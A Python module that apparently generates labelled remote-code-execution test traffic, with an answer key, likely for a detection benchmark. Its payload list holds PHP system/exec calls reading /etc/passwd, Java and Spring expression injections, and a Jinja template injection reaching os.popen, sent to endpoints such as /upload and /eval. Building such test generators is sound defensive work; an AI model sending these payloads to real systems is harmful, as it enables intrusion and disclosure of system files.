import random
from typing import Dict, Tuple
from .base import BaseAttack

class RCEAttack(BaseAttack):
    PAYLOADS = [
        "<?php system('id'); ?>",
        "<?php exec('cat /etc/passwd'); ?>",
        "<?php passthru('whoami'); ?>",
        "${Runtime.getRuntime().exec('id')}",
        "{{7*7}}",
        "${7*7}",
        "<%=system('uname -a')%>",
        "<?php phpinfo(); ?>",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
    ]

    ENDPOINTS = [
        "/upload",
        "/eval",
        "/template",
        "/api/execute"
    ]

    def generate(self, base_url: str) -> Tuple[Dict, Dict]:
        """
        Generates a Remote Code Execution (RCE) attack configuration.
        Returns: (request_kwargs, answer_key_metadata)
        """
        payload = random.choice(self.PAYLOADS)
        endpoint = random.choice(self.ENDPOINTS)
        url = f"{base_url}{endpoint}"
        
        # RCE payloads are typically injected via POST body or query params
        method = random.choice(["GET", "POST"])
        
        request_kwargs = {
            "method": method,
            "url": url,
        }
        
        if method == "POST":
            request_kwargs["data"] = {"code": payload}
        else:
            request_kwargs["params"] = {"input": payload}

        metadata = {
            "type": "RCE",
            "endpoint": endpoint,
            "payload": payload,
            "method": method
        }
        
        return request_kwargs, metadata
